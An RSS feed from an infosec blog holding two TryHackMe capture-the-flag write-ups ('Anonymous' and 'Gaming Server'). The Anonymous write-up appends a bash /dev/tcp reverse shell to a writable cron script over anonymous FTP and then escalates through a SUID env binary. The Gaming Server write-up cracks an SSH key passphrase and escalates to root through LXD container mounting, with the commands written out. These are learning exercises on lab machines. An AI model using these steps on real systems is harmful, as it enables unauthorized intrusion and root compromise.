<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on 0xSh1v4 Infosec Blog</title>
        <link>https://0xSh1v4.github.io/posts/</link>
        <description>Recent content in Posts on 0xSh1v4 Infosec Blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Tue, 01 Sep 2020 00:00:00 +0000</lastBuildDate>
        <atom:link href="https://0xSh1v4.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Tryhackme- Anonymous Writeup</title>
            <link>https://0xSh1v4.github.io/posts/2020/09/tryhackme-anonymous-writeup/</link>
            <pubDate>Tue, 01 Sep 2020 00:00:00 +0000</pubDate>
            
            <guid>https://0xSh1v4.github.io/posts/2020/09/tryhackme-anonymous-writeup/</guid>
            <description>The following write up is for the machine: Anonymous
Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</description>
            <content type="html"><![CDATA[<p>The following write up is for the machine: Anonymous</p>
<p><a href="https://www.tryhackme.com">Tryhackme</a> is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</p>
<h2 id="synopsis">Synopsis</h2>
<p><a href="https://tryhackme.com/room/anonymous">Anonymous</a> is the typical boot2root machine where we need to find two flags in the machine. It comes with an interesting part that explains the exploitation via FTP server to get the reverse shell by which we can obtain a user flag.And the privilege escalation done via weak SUID permissions by which we will obtain our root flag.</p>
<h2 id="scanning-and-enumeration-of-the-network">Scanning and Enumeration of the network</h2>
<p>As usual, let us run the nmap tool to can the target network.</p>
<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Anonymous]
└─$ sudo nmap -sC -sV -sS -oA res 10.10.237.45 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-27 17:07 CEST
Nmap scan report for 10.10.237.45
Host is up (0.069s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.90.133
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2020-08-27T15:07:29+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-08-27T15:07:29
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.65 seconds
</code></pre><p>From the results, we could see an allowance via anonymous ftp login and also the smb ports are open.</p>
<p>So let&rsquo;s find what infos do we get from there.</p>
<figure>
    <img src="/Tryhackme/Anonymous/1.png"
         alt="Tryhackme: Anonymous machine - Download from FTP server"/> <figcaption>
            <p>Tryhackme: Anonymous machine - Download from FTP server</p>
        </figcaption>
</figure>

<p>Now, we have downloaded these files. lets inspect it.</p>
<p>Now, I have downloaded these files. lets inspect it. (<strong>This is the part which learned from this machine</strong>)
I found a bash script (clean.sh) which runs at regular intervals.
I also ran <em>enum4linux</em> since I found some smb port 139 and 445.</p>
<p>Read this nice article about SMB Enumeration: <a href="https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/">SMB-Enumeration</a></p>
<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Anonymous]
└─$ enum4linux -a 10.10.237.45                                                                         130 ⨯
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Aug 27 17:22:06 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.237.45
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.237.45    |
 ==================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================ 
|    Nbtstat Information for 10.10.237.45    |
 ============================================ 
Looking up status of 10.10.237.45
	ANONYMOUS       &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service
	ANONYMOUS       &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service
	ANONYMOUS       &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service
	..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser
	WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name
	WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser
	WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ===================================== 
|    Session Check on 10.10.237.45    |
 ===================================== 
[+] Server 10.10.237.45 allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for 10.10.237.45    |
 =========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 10.10.237.45    |
 ====================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.237.45 from smbclient: 
[+] Got OS info for 10.10.237.45 from srvinfo:
	ANONYMOUS      Wk Sv PrQ Unx NT SNT anonymous server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================= 
|    Users on 10.10.237.45    |
 ============================= 
index: 0x1 RID: 0x3eb acb: 0x00000010 Account: namelessone	Name: namelessone	Desc: 

user:[namelessone] rid:[0x3eb]

 ========================================= 
|    Share Enumeration on 10.10.237.45    |
 ========================================= 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.237.45
//10.10.237.45/print$	Mapping: DENIED, Listing: N/A
//10.10.237.45/pics	Mapping: OK, Listing: OK
//10.10.237.45/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ==================================================== 
|    Password Policy Information for 10.10.237.45    |
 ==================================================== 


[+] Attaching to 10.10.237.45 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] ANONYMOUS
	[+] Builtin

[+] Password Info for Domain: ANONYMOUS

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ============================== 
|    Groups on 10.10.237.45    |
 ============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on 10.10.237.45 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2144577014-3591677122-2188425437
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\namelessone (Local User)
[+] Enumerating users using SID S-1-5-21-2144577014-3591677122-2188425437 and logon username '', password ''
S-1-5-21-2144577014-3591677122-2188425437-500 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-501 ANONYMOUS\nobody (Local User)
S-1-5-21-2144577014-3591677122-2188425437-513 ANONYMOUS\None (Domain Group)
S-1-5-21-2144577014-3591677122-2188425437-514 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-515 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-516 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1001 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1002 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1003 ANONYMOUS\namelessone (Local User)
S-1-5-21-2144577014-3591677122-2188425437-1004 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1005 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1006 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1007 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1008 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1009 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1010 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1011 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1012 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1013 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-1014 *unknown*\*unknown* (8)



 ============================================= 
|    Getting printer info for 10.10.237.45    |
 ============================================= 
No printers returned.


enum4linux complete on Thu Aug 27 17:29:05 2020
</code></pre><p>From the results of <em>enum4linux</em>, I found that anonymous smbshare accessiblity is possible. But there were only image files and doesn&rsquo;t help us much.</p>
<figure>
    <img src="/Tryhackme/Anonymous/2.png"
         alt="Tryhackme: Anonymous machine - Download from SMB Share"/> <figcaption>
            <p>Tryhackme: Anonymous machine - Download from SMB Share</p>
        </figcaption>
</figure>

<p>Also, we have found the local users names from <em>enum4linux</em>.</p>
<ul>
<li>ANONYMOUS\nobody</li>
<li>ANONYMOUS\none</li>
<li>ANONYMOUS\namelessone</li>
</ul>
<h2 id="exploitation-of-the-network">Exploitation of the network</h2>
<p>After looking the results again, It striked me that we have a full write permission on clean.sh script which runs repeatedly and it is possible to upload our shell and get an access to the machine.</p>
<p>we have full write permission on clean.sh file.
<figure>
    <img src="/Tryhackme/Anonymous/3.png"
         alt="Tryhackme: Anonymous machine - Append Shell Code to the sh file"/> <figcaption>
            <p>Tryhackme: Anonymous machine - Append Shell Code to the sh file</p>
        </figcaption>
</figure>
</p>
<p>So, we have append our shell script to the file</p>
<p><code>/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.9.90.133/1234 0&gt;&amp;1'</code></p>
<p>And now we got our rev shell back connecting to the target machine.</p>
<figure>
    <img src="/Tryhackme/Anonymous/4.png"
         alt="Tryhackme: Anonymous machine - Low level shell with the user namelessone"/> <figcaption>
            <p>Tryhackme: Anonymous machine - Low level shell with the user namelessone</p>
        </figcaption>
</figure>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>Now, we have logged in as namelessone user.</p>
<p>Lets see what SUID permission does this user have</p>
<pre><code>namelessone@anonymous:~$ find / -perm -u=s -type f 2&gt;/dev/null
find / -perm -u=s -type f 2&gt;/dev/null
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/bin/umount
/bin/fusermount
/bin/ping
/bin/mount
/bin/su
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">/usr/bin/env</code></pre></div>
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/at
</code></pre><p>The user namelessone has the <strong>ENV</strong> with <em>SUID</em> bit set.</p>
<p>So. we can use it to elevate our privilege
<a href="https://gtfobins.github.io/gtfobins/env/">GTFOBINS-ENV</a></p>
<figure>
    <img src="/Tryhackme/Anonymous/5.png"
         alt="Tryhackme: Anonymous machine - Privilege Escalation to Root"/> <figcaption>
            <p>Tryhackme: Anonymous machine - Privilege Escalation to Root</p>
        </figcaption>
</figure>

<p>And that&rsquo;s how we have got our root flag.</p>
<p>Thanks for reading! Prost! 🍺</p>
<p>If you have any questions: Feel free to contact me.</p>
<p>Twitter Profile: <a href="https://twitter.com/Sh1v4_R4jU">https://twitter.com/Sh1v4_R4jU</a></p>
<p>TryHackMe Profile: <a href="https://tryhackme.com/p/Whiterose">https://tryhackme.com/p/Whiterose</a></p>
<p>HTB Profile: <a href="https://www.hackthebox.eu/home/users/profile/167190">https://www.hackthebox.eu/home/users/profile/167190</a></p>
<p><figure>
    <img src="/HTB_profile.png"
         alt="HTB_Profile"/> 
</figure>

<figure>
    <img src="https://tryhackme-badges.s3.amazonaws.com/Whiterose.png"
         alt="Tryhackme"/> 
</figure>
</p>
]]></content>
        </item>
        
        <item>
            <title>Tryhackme- Gaming Server Writeup</title>
            <link>https://0xSh1v4.github.io/posts/2020/09/tryhackme-gaming-server-writeup/</link>
            <pubDate>Tue, 01 Sep 2020 00:00:00 +0000</pubDate>
            
            <guid>https://0xSh1v4.github.io/posts/2020/09/tryhackme-gaming-server-writeup/</guid>
            <description>The following write up is for the machine: Gaming-Server
Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</description>
            <content type="html"><![CDATA[<p>The following write up is for the machine: Gaming-Server</p>
<p><a href="https://www.tryhackme.com">Tryhackme</a> is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</p>
<h2 id="synopsis">Synopsis</h2>
<p><a href="https://tryhackme.com/room/gamingserver">Gaming-Server</a> is the typical boot2root machine where we need to find two flags in the machine namely user.txt and root.flag.</p>
<h3 id="for-user-flag">For User Flag:</h3>
<p>We need to find the private key and username which was hidden in the application and then we crack the ssh key and find the passphrase and we get into the user flag.</p>
<h3 id="for-root-flag">For Root Flag:</h3>
<p>This is something new for me and took sometime to figure it out and now I&rsquo;ve learned <em>Lxd/LxC</em> privilege  exploitation technique. To find the root flag, we need to exploit the features of lxc/lxd and escalate to the root.</p>
<h2 id="scanning-and-enumeration-of-the-network">Scanning and Enumeration of the network</h2>
<p>Asusual, let us run the nmap tool to can the target network.</p>
<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/gamingserver]
└─$ nmap -sC -sV -oA top 10.10.67.59
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 19:45 CEST
Nmap scan report for 10.10.67.59
Host is up (0.042s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:acb:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.04 seconds
</code></pre><p>In the index.html page, source code. we have the username
<figure>
    <img src="/Tryhackme/GamingServer/8.png"
         alt="Tryhackme: GamingServer machine - Username in Index.html"/> <figcaption>
            <p>Tryhackme: GamingServer machine - Username in Index.html</p>
        </figcaption>
</figure>
</p>
<h3 id="dirb-results">Dirb Results:</h3>
<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/gamingserver]
└─$ dirb http://10.10.67.59  

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Sep  2 19:43:42 2020
URL_BASE: http://10.10.67.59/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.67.59/ ----
+ http://10.10.67.59/index.html (CODE:200|SIZE:2762)                                                                                                                                                                                         
+ http://10.10.67.59/robots.txt (CODE:200|SIZE:33)                                                                                                                                                                                           
==&gt; DIRECTORY: http://10.10.67.59/secret/                                                                                                                                                                                                    
+ http://10.10.67.59/server-status (CODE:403|SIZE:276)                                                                                                                                                                                       
==&gt; DIRECTORY: http://10.10.67.59/uploads/                                                                                                                                                                                                   
                                                                                                                                                                                                                                             
---- Entering directory: http://10.10.67.59/secret/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                             
---- Entering directory: http://10.10.67.59/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Wed Sep  2 19:47:22 2020
</code></pre><p>There is /secret interesting folder and we could see that there is a key.</p>
<figure>
    <img src="/Tryhackme/GamingServer/3.png"
         alt="Tryhackme: GamingServer machine -/secret/ path"/> <figcaption>
            <p>Tryhackme: GamingServer machine -/secret/ path</p>
        </figcaption>
</figure>

<p>lets download the key and examine it.</p>
<p><figure>
    <img src="/Tryhackme/GamingServer/4.png"
         alt="Tryhackme: GamingServer machine - SSH Private Key"/> <figcaption>
            <p>Tryhackme: GamingServer machine - SSH Private Key</p>
        </figcaption>
</figure>

It is RSA private key.</p>
<p>Then, we checked the /robots directory.
<figure>
    <img src="/Tryhackme/GamingServer/1.png"
         alt="Tryhackme: GamingServer machine - robots.txt"/> <figcaption>
            <p>Tryhackme: GamingServer machine - robots.txt</p>
        </figcaption>
</figure>
</p>
<p>Now we see that, we could go to /uploads path.</p>
<figure>
    <img src="/Tryhackme/GamingServer/2.png"
         alt="Tryhackme: GamingServer machine - Uploads Folder"/> <figcaption>
            <p>Tryhackme: GamingServer machine - Uploads Folder</p>
        </figcaption>
</figure>

<p>there is a dict.lst seems like a dictonary which we could use to bruteforce the ssh keys.
<figure>
    <img src="/Tryhackme/GamingServer/5.png"
         alt="Tryhackme: GamingServer machine -Dict.lst file"/> <figcaption>
            <p>Tryhackme: GamingServer machine -Dict.lst file</p>
        </figcaption>
</figure>
</p>
<h2 id="exploitation-of-the-network">Exploitation of the network</h2>
<p>Now, lets try to find the password for the ssh key by sending it to ssh2john and then bruteforce it with the dict.lst which we obtained.</p>
<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/gamingserver]
└─$ /usr/share/john/ssh2john.py ~/.ssh/secretKey &gt; decrpyted_key
</code></pre><p>Now, lets send it to john to decrypt to get our passphrase.
<figure>
    <img src="/Tryhackme/GamingServer/7.png"
         alt="Tryhackme: GamingServer machine - john ssh password"/> <figcaption>
            <p>Tryhackme: GamingServer machine - john ssh password</p>
        </figcaption>
</figure>
</p>
<p>now, we have username and password. lets ssh into the server and we got in now.
<figure>
    <img src="/Tryhackme/GamingServer/9.png"
         alt="Tryhackme: GamingServer machine - ssh into john"/> <figcaption>
            <p>Tryhackme: GamingServer machine - ssh into john</p>
        </figcaption>
</figure>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>Once we have obtained the user flag. now we need to escalate the root level privilege.</p>
<p>After examining, we found that this user is a part of LXD (Linux daemon) group.</p>
<figure>
    <img src="/Tryhackme/GamingServer/10.png"
         alt="Tryhackme: GamingServer machine - LXD group"/> <figcaption>
            <p>Tryhackme: GamingServer machine - LXD group</p>
        </figcaption>
</figure>

<p>&ldquo;A member of the local “lxd” group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package.</p>
<p>LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket. It often does not attempt to match the privileges of the calling user. There are multiple methods to exploit this.</p>
<p>One of them is to use the LXD API to mount the host’s root filesystem into a container. This gives a low-privilege user root access to the host filesystem. &quot;</p>
<p>I have found this nice guide which we could use it.
<a href="https://www.hackingarticles.in/lxd-privilege-escalation/">LXD Privilege Escalation</a></p>
<p>We clone this lxd-alpine-builder by running the below command:</p>
<pre><code>git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
</code></pre><p>On running the above command, we get a tar.gz file which we transfer to our target machine and then follow the below steps.</p>
<pre><code>john@exploitable:/tmp$ lxc image import ./alpine-v3.12-x86_64-20200902_2135.tar.gz --alias myimage
Image imported with fingerprint: bd9262e6c27958294c95902aa18d2e0b7189b170e71c3b16d5986de3ea19e8
john@exploitable:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| myimage | bd9262e6c279 | no     | alpine v3.12 (20200902_21:35) | x86_64 | 2.97MB | Sep 2, 2020 at 8:04pm (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
john@exploitable:/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite
john@exploitable:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
john@exploitable:/tmp$ lxc start ignite
john@exploitable:/tmp$ lxc exec ignite /bin/sh
~ # id
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">uid=0(root) gid=0(root)</code></pre></div>
~ # cd /mnt/root/root
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt 
2e[redacted]fc

</code></pre><p>And thats how we got the root flag. To be honest, the privilege escalation part was tough for me identify and exploit. But for this time, I have got to know about the LXD/LXC exploits. I really enjoyed the machine and learned new things.</p>
<p>Thanks for reading! Prost! 🍺</p>
<p>If you have any questions: Feel free to contact me.</p>
<p>Twitter Profile: <a href="https://twitter.com/Sh1v4_R4jU">https://twitter.com/Sh1v4_R4jU</a></p>
<p>TryHackMe Profile: <a href="https://tryhackme.com/p/Whiterose">https://tryhackme.com/p/Whiterose</a></p>
<p>HTB Profile: <a href="https://www.hackthebox.eu/home/users/profile/167190">https://www.hackthebox.eu/home/users/profile/167190</a></p>
<p><figure>
    <img src="/HTB_profile.png"
         alt="HTB_Profile"/> 
</figure>

<figure>
    <img src="https://tryhackme-badges.s3.amazonaws.com/Whiterose.png"
         alt="Tryhackme"/> 
</figure>
</p>
]]></content>
        </item>
        
    </channel>
</rss>
